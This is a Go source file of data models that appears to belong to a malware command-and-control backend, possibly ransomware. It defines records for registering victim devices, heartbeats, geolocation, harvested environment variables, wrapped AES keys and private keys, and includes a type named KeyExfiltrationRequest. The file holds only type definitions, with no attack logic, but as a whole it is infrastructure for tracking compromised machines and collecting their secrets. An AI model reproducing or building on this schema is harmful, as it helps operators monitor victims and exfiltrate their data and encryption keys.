package models

import (
	"time"

	"go.mongodb.org/mongo-driver/bson/primitive"
)


type DeviceInfo struct {
	Hostname     string    `json:"hostname" bson:"hostname"`
	Username     string    `json:"username" bson:"username"`
	OS           string    `json:"os" bson:"os"`
	Architecture string    `json:"architecture" bson:"architecture"`
	NumCPU       int       `json:"numCpu" bson:"numCpu"`
	GoVersion    string    `json:"goVersion" bson:"goVersion"`
	CurrentTime  time.Time `json:"currentTime" bson:"currentTime"`
	WorkingDir   string    `json:"workingDir" bson:"workingDir"`
	Geo          GeoInfo   `json:"geo" bson:"geo"`
	EnvVars      []string  `json:"envVars" bson:"envVars"`
	WrappedAES   *string   `json:"wrappedAes" bson:"wrappedAes"`
	PublicKey    string    `json:"publicKey" bson:"publicKey"`
	PrivateKey   string    `json:"privateKey" bson:"privateKey"`
}


type GeoInfo struct {
	IP      string `json:"ip" bson:"ip"`
	City    string `json:"city" bson:"city"`
	Region  string `json:"region" bson:"region"`
	Country string `json:"country" bson:"country"`
}


type HeartbeatRequest struct {
	Geo    GeoInfo `json:"geo" bson:"geo"`
	Uptime string  `json:"uptime" bson:"uptime"`
	Mem    struct {
		Total uint64 `json:"total" bson:"total"`
		Used  uint64 `json:"used" bson:"used"`
		Proc  uint64 `json:"proc" bson:"proc"`
	} `json:"mem" bson:"mem"`
	Nonce string `json:"nonce" bson:"nonce"`
}

type DeviceRegistrationRequest struct {
	DeviceID     string `json:"deviceId" bson:"deviceId"`
	PersistentID string `json:"persistentId" bson:"persistentId"`
	DeviceInfo
}

type KeyExfiltrationRequest struct {
	DeviceId  string         `json:"deviceId" bson:"deviceId"`
	Timestamp *time.Time     `json:"timestamp" bson:"timestamp"`
	Data      map[string]any `json:"data" bson:"data"`
}

type WrappedKeyDoc struct {
	ID            primitive.ObjectID `json:"id" bson:"_id,omitempty"`
	DeviceID      string             `json:"deviceId" bson:"deviceId"`
	WrappedKey    string             `json:"wrappedKey" bson:"wrappedKey"`
	Timestamp     time.Time          `json:"timestamp" bson:"timestamp"`
	ClientVersion string             `json:"clientVersion" bson:"clientVersion"`
	RequestType   string             `json:"requestType" bson:"requestType"`
	ReceivedAt    time.Time          `json:"receivedAt" bson:"receivedAt"`
	AssociatedTo  primitive.ObjectID `json:"associatedTo" bson:"associatedTo"`
}

type Device struct {
	ID               primitive.ObjectID `json:"id" bson:"_id,omitempty"`
	DeviceID         string             `json:"deviceId" bson:"deviceId"`
	PersistentID     string             `json:"persistentId" bson:"persistentId"`
	DeviceInfo       `bson:",inline"`
	LastSeen         time.Time `json:"lastSeen" bson:"lastSeen"`
	RegisteredAt     time.Time `json:"registeredAt" bson:"registeredAt"`
	CreatedAt        time.Time `json:"createdAt" bson:"createdAt"`
	Online           bool      `json:"online" bson:"online"`
	HeartbeatCount   int       `json:"heartbeatCount" bson:"heartbeatCount"`
	ConnectionCount  int       `json:"connectionCount" bson:"connectionCount"`
	LastUpdateAt     *time.Time `json:"lastUpdateAt,omitempty" bson:"lastUpdateAt,omitempty"`
	LastNonce        string     `json:"lastNonce,omitempty" bson:"lastNonce,omitempty"`
	Memory           *struct {
		Total uint64 `json:"total" bson:"total"`
		Used  uint64 `json:"used" bson:"used"`
		Proc  uint64 `json:"proc" bson:"proc"`
	} `json:"memory,omitempty" bson:"memory,omitempty"`
	Uptime           string     `json:"uptime,omitempty" bson:"uptime,omitempty"`
	LastKeyUpdate    *time.Time `json:"lastKeyUpdate,omitempty" bson:"lastKeyUpdate,omitempty"`
}